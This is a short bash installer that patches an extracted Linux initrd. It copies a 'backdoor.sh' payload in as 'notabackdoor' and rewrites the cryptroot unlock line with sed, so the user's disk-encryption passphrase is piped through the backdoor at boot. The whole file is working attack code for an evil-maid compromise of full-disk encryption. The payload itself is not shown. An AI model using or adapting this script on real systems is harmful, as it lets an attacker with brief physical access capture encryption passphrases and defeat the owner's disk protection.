#!/bin/bash

# Check arguments
if [ -z "$1" ]; then
    echo "usage: $0 <extracted initrd dir>"
    exit 1
fi

# Get installer location
INSTALLER_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"

# Save location of backdoor.sh and enter extracted initrd directory
BACKDOOR=$(readlink -e "$INSTALLER_DIR/backdoor.sh")
cd "$1"

TARGET_SCRIPT="./scripts/local-top/cryptroot"
TARGET_LINE="\$cryptkeyscript \"\$cryptkey\" \| \$cryptopen\; then"
BACKDOOR_LINE="\$cryptkeyscript \"\$cryptkey\" \| notabackdoor \"\$cryptsource\" "

cp "$BACKDOOR" ./bin/notabackdoor
FILE_CONTENTS=$(cat "$TARGET_SCRIPT" | sed -e "s@$TARGET_LINE@$BACKDOOR_LINE@")
echo "$FILE_CONTENTS" > "$TARGET_SCRIPT"
